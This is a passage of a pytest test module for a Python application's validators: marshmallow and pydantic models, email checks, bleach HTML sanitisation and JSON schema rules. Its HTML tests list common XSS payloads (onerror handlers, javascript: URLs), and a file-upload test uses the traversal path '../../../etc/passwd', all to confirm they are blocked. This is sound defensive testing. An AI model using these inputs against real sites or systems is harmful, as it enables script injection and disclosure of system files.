"""
Unit tests for input validation and sanitization utilities.

This module provides comprehensive test coverage for input validation and sanitization
covering marshmallow schemas, pydantic models, email validation, HTML sanitization,
and security validation patterns per Section 6.6.1 validation requirements.

Test Coverage Areas:
- Input validation and sanitization pipeline testing per F-003-RQ-004
- Schema validation testing maintaining existing patterns per F-004-RQ-001
- Email validation and HTML sanitization for security compliance per Section 3.2.2
- Data validation testing with type checking and performance optimization per Section 3.2.3
- JSON schema validation testing with jsonschema 4.19+ per Section 3.2.3
- Authentication token validation per Section 6.4.1
- XSS prevention and input sanitization per Section 3.2.2

Testing Framework:
- pytest 7.4+ with comprehensive validation fixtures
- marshmallow 3.20+ schema validation testing
- pydantic 2.3+ model validation testing
- email-validator 2.0+ email format validation
- bleach 6.0+ HTML sanitization and XSS prevention
- jsonschema 4.19+ for JSON structure validation
- Performance testing ensuring ≤10% variance requirement
"""

import pytest
import json
import re
from datetime import datetime, timezone, timedelta
from decimal import Decimal
from typing import Any, Dict, List, Optional, Union
from unittest.mock import Mock, patch, MagicMock

# Third-party testing imports
import jsonschema
from jsonschema import ValidationError as JSONSchemaError
import marshmallow as ma
from marshmallow import fields, validate, ValidationError as MarshmallowError
import pydantic
from pydantic import ValidationError as PydanticError
import bleach
import email_validator
from email_validator import EmailNotValidError

# Import modules under test
from src.business.validators import (
    BaseValidator,
    BusinessRuleValidator,
    DataModelValidator,
    InputValidator,
    OutputValidator,
    ValidationContext,
    ValidationType,
    ValidationMode,
    validate_business_data,
    validate_request_data,
    validate_response_data,
    create_validation_schema,
    format_validation_errors
)
from src.business.models import (
    BaseBusinessModel,
    User,
    Organization,
    Product,
    Order,
    OrderItem,
    PaymentTransaction,
    Address,
    ContactInfo,
    MonetaryAmount,
    FileUpload,
    ApiResponse,
    PaginatedResponse,
    validate_model_data,
    serialize_for_api
)
from src.auth.utils import (
    JWTTokenUtils,
    DateTimeUtils,
    InputValidator as AuthInputValidator,
    CryptographicUtils,
    validate_email,
    sanitize_html,
    parse_iso8601_date,
    validate_jwt_token
)
from src.business.exceptions import (
    DataValidationError,
    BusinessRuleViolationError,
    DataProcessingError,
    ErrorSeverity
)

# Test markers for categorization
pytestmark = [
    pytest.mark.utilities,
    pytest.mark.business,
    pytest.mark.security
]


# ============================================================================
# MARSHMALLOW SCHEMA VALIDATION TESTS
# ============================================================================

class TestMarshmallowValidation:
    """
    Test marshmallow 3.20+ schema validation per Section 3.2.2 requirements.
    
    Validates comprehensive schema validation patterns maintaining existing 
    validation behavior per F-004-RQ-001 with enterprise-grade error handling.
    """
    
    def test_base_validator_initialization(self, test_config):
        """Test BaseValidator initialization with configuration."""
        validator = BaseValidator()
        
        assert validator is not None
        assert hasattr(validator, '_validation_metrics')
        assert validator._validation_metrics['validation_count'] == 0
        assert validator._validation_metrics['error_count'] == 0
    
    def test_base_validator_with_context(self, test_config):
        """Test BaseValidator with validation context."""
        context = ValidationContext(
            validation_type=ValidationType.STRICT,
            validation_mode=ValidationMode.CREATE
        )
        
        validator = BaseValidator(validation_context=context)
        
        assert validator.validation_context == context
        assert validator.validation_context.validation_type == ValidationType.STRICT
        assert validator.validation_context.validation_mode == ValidationMode.CREATE
    
    def test_validation_context_creation(self, test_config):
        """Test ValidationContext creation and configuration."""
        context = ValidationContext(
            validation_type=ValidationType.SANITIZING,
            validation_mode=ValidationMode.UPDATE,
            strict_mode=False,
            user_context={'user_id': 'test-123'},
            business_rules={'email_unique', 'password_strength'}
        )
        
        assert context.validation_type == ValidationType.SANITIZING
        assert context.validation_mode == ValidationMode.UPDATE
        assert context.strict_mode is False
        assert context.user_context['user_id'] == 'test-123'
        assert 'email_unique' in context.business_rules
        assert 'password_strength' in context.business_rules
    
    def test_validation_context_manager(self, test_config):
        """Test ValidationContext as context manager."""
        with ValidationContext(
            validation_type=ValidationType.STRICT
        ) as context:
            assert context.validation_type == ValidationType.STRICT
            assert hasattr(context, '_validation_start_time')
            
            # Add test error
            context.add_error({'field': 'test', 'message': 'test error'})
            assert context.has_errors()
            assert len(context.get_errors()) == 1
    
    def test_data_model_validator_basic(self, sample_business_data, test_config):
        """Test DataModelValidator with basic data validation."""
        class TestSchema(DataModelValidator):
            name = fields.String(required=True, validate=validate.Length(min=1, max=100))
            email = fields.Email(required=True)
            age = fields.Integer(validate=validate.Range(min=0, max=150))
            active = fields.Boolean()
        
        # Test valid data
        valid_data = {
            'name': 'John Doe',
            'email': 'john@example.com',
            'age': 30,
            'active': True
        }
        
        validator = TestSchema()
        result = validator.load_with_context(valid_data)
        
        assert result['name'] == 'John Doe'
        assert result['email'] == 'john@example.com'
        assert result['age'] == 30
        assert result['active'] is True
    
    def test_data_model_validator_validation_errors(self, test_config):
        """Test DataModelValidator error handling."""
        class TestSchema(DataModelValidator):
            name = fields.String(required=True, validate=validate.Length(min=2))
            email = fields.Email(required=True)
            age = fields.Integer(validate=validate.Range(min=0))
        
        invalid_data = {
            'name': 'A',  # Too short
            'email': 'invalid-email',  # Invalid email
            'age': -5  # Invalid age
        }
        
        validator = TestSchema()
        
        with pytest.raises(DataValidationError) as exc_info:
            validator.load_with_context(invalid_data)
        
        error = exc_info.value
        assert error.error_code == "SCHEMA_VALIDATION_FAILED"
        assert len(error.validation_errors) > 0
        
        # Check specific field errors
        field_names = [err['field'] for err in error.validation_errors]
        assert 'name' in field_names
        assert 'email' in field_names
        assert 'age' in field_names
    
    def test_business_rule_validator(self, test_config):
        """Test BusinessRuleValidator with custom rules."""
        class UserValidator(BusinessRuleValidator):
            username = fields.String(required=True, validate=validate.Length(min=3))
            email = fields.Email(required=True)
            password = fields.String(required=True, validate=validate.Length(min=8))
        
        # Register custom business rule
        def validate_unique_username(data, context):
            if data.get('username') == 'admin':
                raise BusinessRuleViolationError(
                    message="Username 'admin' is reserved",
                    error_code="RESERVED_USERNAME"
                )
        
        UserValidator.register_business_rule(
            'unique_username',
            validate_unique_username,
            "Ensure username is not reserved"
        )
        
        # Test valid data
        valid_data = {
            'username': 'johndoe',
            'email': 'john@example.com',
            'password': 'SecurePass123!'
        }
        
        context = ValidationContext(business_rules={'unique_username'})
        validator = UserValidator(validation_context=context)
        result = validator.load_with_context(valid_data, context)
        
        assert result['username'] == 'johndoe'
        
        # Test business rule violation
        invalid_data = {
            'username': 'admin',
            'email': 'admin@example.com',
            'password': 'SecurePass123!'
        }
        
        with pytest.raises(BusinessRuleViolationError) as exc_info:
            validator.load_with_context(invalid_data, context)
        
        error = exc_info.value
        assert error.error_code == "RESERVED_USERNAME"
        assert "admin" in error.message
    
    def test_input_validator_sanitization(self, sample_html_content, test_config):
        """Test InputValidator with sanitization features."""
        class ContactFormValidator(InputValidator):
            name = fields.String(required=True, validate=validate.Length(min=2, max=100))
            email = fields.Email(required=True)
            message = fields.String(required=True, validate=validate.Length(min=10))
            phone = fields.String(validate=validate.Length(max=20))
        
        # Test with data requiring sanitization
        input_data = {
            'name': '  John Doe  ',  # Extra whitespace
            'email': 'JOHN@EXAMPLE.COM',  # Mixed case
            'message': sample_html_content['safe'],
            'phone': '+1 (555) 123-4567'
        }
        
        validator = ContactFormValidator(enable_sanitization=True)
        result = validator.load_with_context(input_data)
        
        assert result['name'] == 'John Doe'  # Trimmed
        assert result['email'] == 'john@example.com'  # Lowercased
        assert '<p>' in result['message']  # Safe HTML preserved
        assert result['phone'] == '+1 (555) 123-4567'  # Phone formatted
    
    def test_output_validator_response_formatting(self, test_config):
        """Test OutputValidator response formatting."""
        class UserResponseValidator(OutputValidator):
            id = fields.String(required=True)
            email = fields.Email(required=True)
            name = fields.String(required=True)
            created_at = fields.DateTime(dump_only=True)
        
        user_data = {
            'id': 'user-123',
            'email': 'john@example.com',
            'name': 'John Doe',
            'created_at': datetime.now(timezone.utc)
        }
        
        validator = UserResponseValidator()
        
        # Test success response formatting
        response = validator.format_success_response(
            user_data,
            status_code=200,
            message="User retrieved successfully"
        )
        
        assert response['success'] is True
        assert response['status_code'] == 200
        assert response['message'] == "User retrieved successfully"
        assert 'data' in response
        assert response['data']['id'] == 'user-123'
        assert 'timestamp' in response
    
    def test_output_validator_error_formatting(self, test_config):
        """Test OutputValidator error response formatting."""
        validator = OutputValidator()
        
        # Create test error
        error = DataValidationError(
            message="Validation failed",
            error_code="TEST_VALIDATION_ERROR",
            validation_errors=[
                {'field': 'email', 'message': 'Invalid email format'},
                {'field': 'age', 'message': 'Must be positive'}
            ]
        )
        
        response = validator.format_error_response(error, include_details=True)
        
        assert response['success'] is False
        assert response['error']['code'] == "TEST_VALIDATION_ERROR"
        assert response['error']['message'] == "Validation failed"
        assert 'validation_errors' in response['error']
        assert len(response['error']['validation_errors']) == 2
        assert 'timestamp' in response
    
    def test_paginated_response_formatting(self, test_config):
        """Test paginated response formatting."""
        from src.business.models import PaginationParams
        
        # Create test data
        test_items = [
            {'id': f'item-{i}', 'name': f'Item {i}'}
            for i in range(1, 6)  # 5 items
        ]
        
        pagination_params = PaginationParams(page=1, page_size=3)
        validator = OutputValidator()
        
        response = validator.format_paginated_response(
            data=test_items[:3],  # First 3 items
            page=1,
            per_page=3,
            total_count=5
        )
        
        assert response['success'] is True
        assert len(response['data']) == 3
        assert response['pagination']['page'] == 1
        assert response['pagination']['per_page'] == 3
        assert response['pagination']['total_count'] == 5
        assert response['pagination']['total_pages'] == 2
        assert response['pagination']['has_next'] is True
        assert response['pagination']['has_prev'] is False
    
    @pytest.mark.performance
    def test_validation_performance(self, large_dataset, performance_timer, test_config):
        """Test validation performance requirements."""
        class DataValidator(DataModelValidator):
            id = fields.Integer(required=True)
            name = fields.String(required=True)
            value = fields.String(required=True)
            metadata = fields.Dict()
        
        validator = DataValidator()
        
        # Test with large dataset
        test_data = list(large_dataset.values())[:100]  # Test with 100 items
        
        performance_timer.start()
        
        results = []
        for item in test_data:
            try:
                result = validator.load_with_context(item)
                results.append(result)
            except DataValidationError:
                # Skip invalid items for performance test
                pass
        
        performance_timer.stop()
        
        # Validate performance requirement (≤10% variance)
        # Assuming baseline of 1 second for 100 validations
        performance_timer.assert_duration_under(1.1)  # 10% variance
        
        # Verify some validations succeeded
        assert len(results) > 0


# ============================================================================
# PYDANTIC MODEL VALIDATION TESTS
# ============================================================================

class TestPydanticValidation:
    """
    Test pydantic 2.3+ model validation per Section 3.2.3 requirements.
    
    Validates data validation testing with type checking and performance
    optimization per Section 3.2.3 with comprehensive model testing.
    """
    
    def test_base_business_model_creation(self, test_config):
        """Test BaseBusinessModel creation and validation."""
        # Test with valid data
        model_data = {
            'created_at': datetime.now(timezone.utc),
            'version': 1
        }
        
        model = BaseBusinessModel(**model_data)
        
        assert model.created_at is not None
        assert model.updated_at is not None
        assert model.version == 1
        assert isinstance(model.created_at, datetime)
        assert isinstance(model.updated_at, datetime)
    
    def test_base_business_model_validation_error(self, test_config):
        """Test BaseBusinessModel validation error handling."""
        # Test with invalid data
        invalid_data = {
            'version': 'not-a-number'  # Should be integer
        }
        
        with pytest.raises(DataValidationError) as exc_info:
            BaseBusinessModel(**invalid_data)
        
        error = exc_info.value
        assert error.error_code == "MODEL_VALIDATION_FAILED"
        assert 'version' in str(error.message)
    
    def test_user_model_validation(self, test_config):
        """Test User model comprehensive validation."""
        valid_user_data = {
            'username': 'johndoe',
            'email': 'john@example.com',
            'first_name': 'John',
            'last_name': 'Doe',
            'status': 'active',
            'role': 'user',
            'language_code': 'en',
            'timezone': 'UTC'
        }
        
        user = User(**valid_user_data)
        
        assert user.username == 'johndoe'
        assert user.email == 'john@example.com'
        assert user.full_name == 'John Doe'
        assert user.is_active is True
        assert user.status.value == 'active'
        assert user.role.value == 'user'
    
    def test_user_model_business_rules(self, test_config):
        """Test User model business rule validation."""
        # Test reserved username
        invalid_user_data = {
            'username': 'admin',  # Reserved username
            'email': 'admin@example.com',
            'first_name': 'Admin',
            'last_name': 'User'
        }
        
        with pytest.raises(BusinessRuleViolationError) as exc_info:
            User(**invalid_user_data)
        
        error = exc_info.value
        assert error.error_code == "RESERVED_USERNAME"
        assert 'admin' in error.message
    
    def test_user_model_permissions(self, test_config):
        """Test User model permission validation."""
        user_data = {
            'username': 'testuser',
            'email': 'test@example.com',
            'first_name': 'Test',
            'last_name': 'User',
            'role': 'admin',
            'permissions': {'read', 'write', 'delete', 'admin'}
        }
        
        user = User(**user_data)
        
        assert user.has_permission('read') is True
        assert user.has_permission('admin') is True
        assert user.has_permission('unknown') is True  # Admin has all permissions
        
        # Test regular user
        user_data['role'] = 'user'
        user_data['permissions'] = {'read', 'write'}
        user = User(**user_data)
        
        assert user.has_permission('read') is True
        assert user.has_permission('write') is True
        assert user.has_permission('delete') is False
        assert user.has_permission('admin') is False
    
    def test_address_model_validation(self, test_config):
        """Test Address model validation."""
        valid_address = {
            'street_line_1': '123 Main St',
            'city': 'New York',
            'state_province': 'NY',
            'postal_code': '10001',
            'country_code': 'US'
        }
        
        address = Address(**valid_address)
        
        assert address.street_line_1 == '123 Main St'
        assert address.city == 'New York'
        assert address.country_code == 'US'
        
        # Test formatted address
        formatted = address.get_formatted_address()
        assert '123 Main St' in formatted
        assert 'New York, NY 10001' in formatted
        assert 'US' in formatted
        
        # Test single line format
        single_line = address.get_formatted_address(single_line=True)
        assert ', ' in single_line
        assert '\n' not in single_line
    
    def test_contact_info_validation(self, test_config):
        """Test ContactInfo model validation."""
        valid_contact = {
            'primary_email': 'john@example.com',
            'primary_phone': '+1-555-123-4567',
            'preferred_contact_method': 'email',
            'allow_marketing': True
        }
        
        contact = ContactInfo(**valid_contact)
        
        assert contact.primary_email == 'john@example.com'
        assert contact.primary_phone == '+1-555-123-4567'
        assert contact.preferred_contact_method.value == 'email'
        assert contact.allow_marketing is True
    
    def test_contact_info_business_rules(self, test_config):
        """Test ContactInfo business rule validation."""
        # Test missing primary contact
        invalid_contact = {
            'secondary_email': 'backup@example.com',
            'allow_marketing': False
        }
        
        contact = ContactInfo(**invalid_contact)
        
        with pytest.raises(BusinessRuleViolationError) as exc_info:
            contact.validate_business_rules()
        
        error = exc_info.value
        assert error.error_code == "MISSING_PRIMARY_CONTACT"
    
    def test_monetary_amount_validation(self, sample_financial_data, test_config):
        """Test MonetaryAmount model validation."""
        # Test valid amounts
        for amount in sample_financial_data['amounts']:
            money = MonetaryAmount(amount=amount, currency_code='USD')
            assert money.amount == amount
            assert money.currency_code == 'USD'
            
            # Test rounding
            rounded = money.get_rounded_amount()
            assert isinstance(rounded, Decimal)
    
    def test_monetary_amount_business_rules(self, test_config):
        """Test MonetaryAmount business rule validation."""
        # Test negative amount
        with pytest.raises(BusinessRuleViolationError) as exc_info:
            MonetaryAmount(amount=Decimal('-10.00'), currency_code='USD')
        
        error = exc_info.value
        assert error.error_code == "NEGATIVE_AMOUNT"
        
        # Test invalid currency code
        with pytest.raises(BusinessRuleViolationError) as exc_info:
            MonetaryAmount(amount=Decimal('100.00'), currency_code='INVALID')
        
        error = exc_info.value
        assert error.error_code == "INVALID_CURRENCY_CODE"
    
    def test_product_model_validation(self, test_config):
        """Test Product model validation."""
        valid_product = {
            'sku': 'PROD-001',
            'name': 'Test Product',
            'slug': 'test-product',
            'base_price': {
                'amount': Decimal('99.99'),
                'currency_code': 'USD'
            },
            'inventory_quantity': 100,
            'status': 'active'
        }
        
        product = Product(**valid_product)
        
        assert product.sku == 'PROD-001'
        assert product.name == 'Test Product'
        assert product.base_price.amount == Decimal('99.99')
        assert product.current_price == product.base_price
        assert product.is_on_sale is False
        assert product.is_low_stock is False  # Above threshold
    
    def test_product_sale_pricing(self, test_config):
        """Test Product sale price validation."""
        product_data = {
            'sku': 'SALE-001',
            'name': 'Sale Product',
            'slug': 'sale-product',
            'base_price': {
                'amount': Decimal('100.00'),
                'currency_code': 'USD'
            },
            'sale_price': {
                'amount': Decimal('80.00'),
                'currency_code': 'USD'
            }
        }
        
        product = Product(**product_data)
        
        assert product.is_on_sale is True
        assert product.current_price == product.sale_price
        assert product.current_price.amount == Decimal('80.00')
    
    def test_product_business_rules(self, test_config):
        """Test Product business rule validation."""
        # Test sale price higher than base price
        invalid_product = {
            'sku': 'INVALID-001',
            'name': 'Invalid Product',
            'slug': 'invalid-product',
            'base_price': {
                'amount': Decimal('50.00'),
                'currency_code': 'USD'
            },
            'sale_price': {
                'amount': Decimal('60.00'),  # Higher than base
                'currency_code': 'USD'
            }
        }
        
        product = Product(**invalid_product)
        
        with pytest.raises(BusinessRuleViolationError) as exc_info:
            product.validate_business_rules()
        
        error = exc_info.value
        assert error.error_code == "INVALID_SALE_PRICE"
    
    def test_file_upload_validation(self, test_config):
        """Test FileUpload model validation."""
        valid_file = {
            'filename': 'document.pdf',
            'content_type': 'application/pdf',
            'file_size': 1024000,  # 1MB
            'uploaded_by': 'user-123'
        }
        
        file_upload = FileUpload(**valid_file)
        
        assert file_upload.filename == 'document.pdf'
        assert file_upload.content_type == 'application/pdf'
        assert file_upload.file_extension == 'pdf'
        assert file_upload.is_image is False
        assert file_upload.is_expired is False
    
    def test_file_upload_security_validation(self, test_config):
        """Test FileUpload security validation."""
        # Test dangerous filename
        with pytest.raises(BusinessRuleViolationError) as exc_info:
            FileUpload(
                filename='../../../etc/passwd',
                content_type='text/plain',
                file_size=1024
            )
        
        error = exc_info.value
        assert error.error_code == "INVALID_FILE_NAME"
        
        # Test disallowed content type
        with pytest.raises(BusinessRuleViolationError) as exc_info:
            FileUpload(
                filename='script.js',
                content_type='application/javascript',
                file_size=1024
            )
        
        error = exc_info.value
        assert error.error_code == "CONTENT_TYPE_NOT_ALLOWED"
    
    def test_api_response_creation(self, test_config):
        """Test ApiResponse model creation."""
        # Test success response
        success_response = ApiResponse.success_response(
            data={'id': '123', 'name': 'Test'},
            message='Operation successful',
            request_id='req-123'
        )
        
        assert success_response.success is True
        assert success_response.data['id'] == '123'
        assert success_response.message == 'Operation successful'
        assert success_response.request_id == 'req-123'
        assert success_response.errors is None
        
        # Test error response
        error_response = ApiResponse.error_response(
            message='Operation failed',
            errors=[{'code': 'TEST_ERROR', 'message': 'Test error'}],
            request_id='req-456'
        )
        
        assert error_response.success is False
        assert error_response.message == 'Operation failed'
        assert error_response.request_id == 'req-456'
        assert len(error_response.errors) == 1
        assert error_response.data is None
    
    def test_model_registry_functionality(self, test_config):
        """Test model registry and utility functions."""
        from src.business.models import get_model_by_name, validate_model_data
        
        # Test getting model by name
        user_model = get_model_by_name('User')
        assert user_model == User
        
        # Test unknown model
        unknown_model = get_model_by_name('UnknownModel')
        assert unknown_model is None
        
        # Test data validation
        user_data = {
            'username': 'testuser',
            'email': 'test@example.com',
            'first_name': 'Test',
            'last_name': 'User'
        }
        
        validated_user = validate_model_data('User', user_data)
        assert isinstance(validated_user, User)
        assert validated_user.username == 'testuser'
    
    @pytest.mark.performance
    def test_model_validation_performance(self, large_dataset, performance_timer, test_config):
        """Test pydantic model validation performance."""
        # Create test data
        user_data_list = [
            {
                'username': f'user_{i}',
                'email': f'user_{i}@example.com',
                'first_name': f'User',
                'last_name': f'{i}',
                'status': 'active'
            }
            for i in range(100)
        ]
        
        performance_timer.start()
        
        validated_users = []
        for user_data in user_data_list:
            try:
                user = User(**user_data)
                validated_users.append(user)
            except Exception:
                # Skip invalid users for performance test
                pass
        
        performance_timer.stop()
        
        # Performance requirement: ≤10% variance
        performance_timer.assert_duration_under(1.0)  # Base 1 second for 100 models
        
        assert len(validated_users) == 100


# ============================================================================
# EMAIL VALIDATION TESTS
# ============================================================================

class TestEmailValidation:
    """
    Test email validation using email-validator 2.0+ per Section 3.2.2.
    
    Validates comprehensive email format validation and sanitization for
    security compliance with enterprise validation standards.
    """
    
    def test_valid_email_formats(self, sample_validation_data, test_config):
        """Test validation of valid email formats."""
        for email in sample_validation_data['emails']['valid']:
            is_valid, result = validate_email(email, normalize=True)
            
            assert is_valid is True
            assert isinstance(result, str)
            assert '@' in result
            assert result == result.lower()  # Should be normalized to lowercase
    
    def test_invalid_email_formats(self, sample_validation_data, test_config):
        """Test rejection of invalid email formats."""
        for email in sample_validation_data['emails']['invalid']:
            if email is not None:  # Skip None values
                is_valid, error_message = validate_email(email, normalize=True)
                
                assert is_valid is False
                assert isinstance(error_message, str)
                assert len(error_message) > 0
    
    def test_email_validation_with_deliverability(self, test_config):
        """Test email validation with deliverability checking."""
        # Mock deliverability check to avoid external dependencies
        with patch('email_validator.validate_email') as mock_validate:
            mock_validate.return_value = Mock(email='test@example.com')
            
            is_valid, result = validate_email(
                'test@example.com',
                check_deliverability=True,
                normalize=True
            )
            
            assert is_valid is True
            assert result == 'test@example.com'
            mock_validate.assert_called_once()
    
    def test_email_validation_error_handling(self, test_config):
        """Test email validation error handling."""
        # Test with email that will cause EmailNotValidError
        with patch('email_validator.validate_email') as mock_validate:
            mock_validate.side_effect = EmailNotValidError("Invalid email")
            
            is_valid, error_message = validate_email('invalid@email')
            
            assert is_valid is False
            assert "Invalid email" in error_message
    
    def test_auth_input_validator_email(self, test_config):
        """Test AuthInputValidator email validation."""
        validator = AuthInputValidator()
        
        # Test valid email
        is_valid, result = validator.validate_email(
            'test@example.com',
            normalize=True
        )
        
        assert is_valid is True
        assert result == 'test@example.com'
        
        # Test invalid email
        is_valid, error = validator.validate_email('invalid-email')
        
        assert is_valid is False
        assert isinstance(error, str)
    
    def test_email_case_normalization(self, test_config):
        """Test email case normalization."""
        test_emails = [
            'Test@Example.Com',
            'USER@DOMAIN.ORG',
            'MixedCase@Example.net'
        ]
        
        for email in test_emails:
            is_valid, normalized = validate_email(email, normalize=True)
            
            assert is_valid is True
            assert normalized == email.lower()
            assert normalized.islower()
    
    @pytest.mark.performance
    def test_email_validation_performance(self, performance_timer, test_config):
        """Test email validation performance."""
        test_emails = [
            f'user{i}@example.com' for i in range(100)
        ]
        
        performance_timer.start()
        
        valid_count = 0
        for email in test_emails:
            is_valid, _ = validate_email(email, normalize=True)
            if is_valid:
                valid_count += 1
        
        performance_timer.stop()
        
        # Performance requirement
        performance_timer.assert_duration_under(1.0)  # 1 second for 100 emails
        assert valid_count == 100  # All should be valid


# ============================================================================
# HTML SANITIZATION TESTS
# ============================================================================

class TestHTMLSanitization:
    """
    Test HTML sanitization using bleach 6.0+ per Section 3.2.2.
    
    Validates XSS prevention and input sanitization for security compliance
    with comprehensive HTML cleaning and security validation.
    """
    
    def test_safe_html_preservation(self, sample_html_content, test_config):
        """Test that safe HTML content is preserved."""
        safe_html = sample_html_content['safe']
        sanitized = sanitize_html(safe_html)
        
        # Safe tags should be preserved
        assert '<p>' in sanitized
        assert '<strong>' in sanitized
        assert '<em>' in sanitized
        assert 'safe' in sanitized
        assert 'emphasis' in sanitized
    
    def test_dangerous_html_removal(self, sample_html_content, test_config):
        """Test that dangerous HTML content is removed."""
        dangerous_html = sample_html_content['dangerous']
        sanitized = sanitize_html(dangerous_html)
        
        # Dangerous elements should be removed
        assert '<script>' not in sanitized.lower()
        assert '<iframe>' not in sanitized.lower()
        assert '<object>' not in sanitized.lower()
        assert '<embed>' not in sanitized.lower()
        assert 'javascript:' not in sanitized.lower()
        assert 'onerror=' not in sanitized.lower()
        assert 'alert(' not in sanitized.lower()
        
        # Safe content should remain
        assert 'Safe paragraph' in sanitized
    
    def test_mixed_html_cleaning(self, sample_html_content, test_config):
        """Test cleaning of mixed safe and dangerous HTML."""
        mixed_html = sample_html_content['mixed']
        sanitized = sanitize_html(mixed_html)
        
        # Safe elements should remain
        assert '<h1>' in sanitized
        assert '<p>' in sanitized
        assert '<ul>' in sanitized
        assert '<li>' in sanitized
        assert 'Title' in sanitized
        assert 'Safe content' in sanitized
        assert 'List item' in sanitized
        
        # Dangerous elements should be removed
        assert '<script>' not in sanitized.lower()
        assert '<form>' not in sanitized.lower()
        assert '<input>' not in sanitized.lower()
        assert 'dangerous' not in sanitized  # Content in script tag
        assert 'steal_data' not in sanitized
    
    def test_html_stripping(self, sample_html_content, test_config):
        """Test complete HTML tag stripping."""
        html_content = sample_html_content['safe']
        stripped = sanitize_html(html_content, strip_tags=True)
        
        # All HTML tags should be removed
        assert '<' not in stripped
        assert '>' not in stripped
        assert 'safe' in stripped  # Text content preserved
        assert 'emphasis' in stripped
    
    def test_custom_tag_configuration(self, test_config):
        """Test HTML sanitization with custom allowed tags."""
        html_content = '<p>Paragraph</p><div>Div content</div><span>Span text</span>'
        
        # Allow only specific tags
        custom_tags = {'p', 'span'}
        sanitized = sanitize_html(
            html_content,
            custom_tags=custom_tags
        )
        
        assert '<p>' in sanitized
        assert '<span>' in sanitized
        assert '<div>' not in sanitized
        assert 'Paragraph' in sanitized
        assert 'Span text' in sanitized
        assert 'Div content' in sanitized  # Content preserved
    
    def test_unicode_html_handling(self, sample_html_content, test_config):
        """Test HTML sanitization with Unicode content."""
        unicode_html = sample_html_content['unicode']
        sanitized = sanitize_html(unicode_html)
        
        # Unicode characters should be preserved
        assert 'café' in sanitized
        assert 'naïve' in sanitized
        assert 'résumé' in sanitized
        assert '<p>' in sanitized
    
    def test_html_entity_handling(self, sample_html_content, test_config):
        """Test HTML entity handling in sanitization."""
        entity_html = sample_html_content['special_chars']
        sanitized = sanitize_html(entity_html)
        
        # HTML entities should be handled correctly
        assert '&lt;' in sanitized or '<' in sanitized
        assert '&gt;' in sanitized or '>' in sanitized
        assert '&amp;' in sanitized or '&' in sanitized
        assert '<p>' in sanitized
    
    def test_input_validator_html_sanitization(self, test_config):
        """Test InputValidator HTML sanitization integration."""
        validator = AuthInputValidator()
        
        dangerous_html = '<p>Safe content</p><script>alert("xss")</script>'
        sanitized = validator.sanitize_html(dangerous_html)
        
        assert '<p>' in sanitized
        assert 'Safe content' in sanitized
        assert '<script>' not in sanitized
        assert 'alert' not in sanitized
    
    def test_xss_attack_vectors(self, test_config):
        """Test protection against common XSS attack vectors."""
        xss_vectors = [
            '<img src="x" onerror="alert(1)">',
            '<svg onload="alert(1)">',
            '<iframe src="javascript:alert(1)"></iframe>',
            '<link rel="stylesheet" href="javascript:alert(1)">',
            '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
            '<input type="image" src="x" onerror="alert(1)">',
            '<body onload="alert(1)">',
            '<div style="background:url(javascript:alert(1))">',
            '<a href="javascript:alert(1)">Click me</a>',
            '<form action="javascript:alert(1)"><input type="submit"></form>'
        ]
        
        for vector in xss_vectors:
            sanitized = sanitize_html(vector)
            
            # None of the dangerous patterns should remain
            assert 'javascript:' not in sanitized.lower()
            assert 'onerror=' not in sanitized.lower()
            assert 'onload=' not in sanitized.lower()
            assert 'alert(' not in sanitized.lower()
            assert '<script' not in sanitized.lower()
            assert '<iframe' not in sanitized.lower()
            assert '<object' not in sanitized.lower()
            assert '<embed' not in sanitized.lower()
    
    @pytest.mark.performance
    def test_html_sanitization_performance(self, performance_timer, test_config):
        """Test HTML sanitization performance."""
        # Create large HTML content
        large_html = '<p>' + 'Large content with safe HTML. ' * 100 + '</p>'
        large_html += '<div>' + 'More content in div tags. ' * 50 + '</div>'
        
        performance_timer.start()
        
        # Sanitize multiple times
        for _ in range(50):
            sanitized = sanitize_html(large_html)
            assert '<p>' in sanitized
        
        performance_timer.stop()
        
        # Performance requirement
        performance_timer.assert_duration_under(1.0)  # 1 second for 50 sanitizations


# ============================================================================
# JSON SCHEMA VALIDATION TESTS
# ============================================================================

class TestJSONSchemaValidation:
    """
    Test JSON schema validation using jsonschema 4.19+ per Section 3.2.3.
    
    Validates JSON structure validation and schema compliance for API
    request/response validation with comprehensive schema testing.
    """
    
    def test_basic_json_schema_validation(self, json_schemas, test_config):
        """Test basic JSON schema validation."""
        user_schema = json_schemas['user']
        
        # Test valid data
        valid_user = {
            'name': 'John Doe',
            'email': 'john@example.com',
            'age': 30,
            'active': True,
            'roles': ['user', 'admin']
        }
        
        # Should not raise exception
        jsonschema.validate(valid_user, user_schema)
    
    def test_json_schema_validation_errors(self, json_schemas, test_config):
        """Test JSON schema validation error handling."""
        user_schema = json_schemas['user']
        
        # Test missing required field
        invalid_user = {
            'email': 'john@example.com',
            'age': 30
            # Missing required 'name'
        }
        
        with pytest.raises(JSONSchemaError) as exc_info:
            jsonschema.validate(invalid_user, user_schema)
        
        error = exc_info.value
        assert 'name' in str(error.message)
        assert 'required' in str(error.message).lower()
    
    def test_json_schema_type_validation(self, json_schemas, test_config):
        """Test JSON schema type validation."""
        user_schema = json_schemas['user']
        
        # Test invalid type
        invalid_user = {
            'name': 'John Doe',
            'email': 'john@example.com',
            'age': 'thirty',  # Should be integer
            'active': True,
            'roles': ['user']
        }
        
        with pytest.raises(JSONSchemaError) as exc_info:
            jsonschema.validate(invalid_user, user_schema)
        
        error = exc_info.value
        assert 'age' in str(error.message) or 'thirty' in str(error.message)
    
    def test_json_schema_string_constraints(self, json_schemas, test_config):
        """Test JSON schema string constraint validation."""
        user_schema = json_schemas['user']
        
        # Test string too long
        invalid_user = {
            'name': 'x' * 101,  # Exceeds maxLength of 100
            'email': 'john@example.com',
            'age': 30,
            'active': True,
            'roles': ['user']
        }
        
        with pytest.raises(JSONSchemaError) as exc_info:
            jsonschema.validate(invalid_user, user_schema)
        
        error = exc_info.value
        assert 'name' in str(error.message) or 'maxLength' in str(error.message)
    
    def test_json_schema_array_validation(self, json_schemas, test_config):
        """Test JSON schema array validation."""
        user_schema = json_schemas['user']
        
        # Test empty array when minItems is required
        invalid_user = {
            'name': 'John Doe',
            'email': 'john@example.com',
            'age': 30,
            'active': True,
            'roles': []  # Empty array, but minItems is 1
        }
        
        with pytest.raises(JSONSchemaError) as exc_info:
            jsonschema.validate(invalid_user, user_schema)
        
        error = exc_info.value
        assert 'roles' in str(error.message) or 'minItems' in str(error.message)
    
    def test_json_schema_additional_properties(self, json_schemas, test_config):
        """Test JSON schema additional properties handling."""
        user_schema = json_schemas['user']
        
        # Test additional property when additionalProperties is False
